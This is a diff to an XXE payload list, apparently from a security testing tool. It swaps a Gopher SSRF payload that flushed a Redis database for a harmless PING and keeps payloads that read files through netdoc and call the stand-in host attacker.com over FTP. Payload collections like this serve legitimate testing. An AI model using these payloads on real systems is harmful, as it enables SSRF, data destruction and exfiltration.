@@ -213,11 +213,11 @@ payloads:
     ]>
     <foo>&xxe;</foo>
 
-  # Gopher Protocol SSRF
+  # Gopher Protocol SSRF (non-destructive - Redis PING)
   - |
     <?xml version="1.0"?>
     <!DOCTYPE foo [
-      <!ENTITY xxe SYSTEM "gopher://localhost:6379/_flushall">
+      <!ENTITY xxe SYSTEM "gopher://localhost:6379/_PING">
     ]>
     <foo>&xxe;</foo>
 
@@ -229,7 +229,7 @@ payloads:
     ]>
     <foo>&xxe;</foo>
 
-  # Jar Protocol (Java) - Netdoc
+  # Java netdoc:// Protocol - File Read
   - |
     <?xml version="1.0"?>
     <!DOCTYPE foo [
@@ -241,7 +241,7 @@ payloads:
   - |
     <?xml version="1.0"?>
     <!DOCTYPE foo [
-      <!ENTITY xxe SYSTEM "ftp://user:pass@attacker.com:21/test">
+      <!ENTITY xxe SYSTEM "ftp://USER:PASS@attacker.com:21/test">
     ]>
     <foo>&xxe;</foo>
 
